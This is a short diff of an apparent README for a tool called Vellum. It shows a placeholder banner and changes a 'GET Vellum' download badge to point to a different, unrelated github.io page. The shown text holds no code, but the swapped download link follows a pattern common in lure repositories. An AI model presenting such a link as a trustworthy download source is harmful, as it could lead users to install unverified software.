@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=fd56a04f8270e721cf591ed1788a37bc4c8a992a-4034704-images-thumbs&n=13)
 
-[![GET Vellum](https://img.shields.io/badge/GET%20%E2%80%94%20Vellum-0078D6?style=for-the-badge&logoColor=white)](https://component-store-cleanup-tools.github.io/.github/vellum-app)
+[![GET Vellum](https://img.shields.io/badge/GET%20%E2%80%94%20Vellum-0078D6?style=for-the-badge&logoColor=white)](https://samhornwfpv.github.io/.github/vellum-app)
 
 ---
 
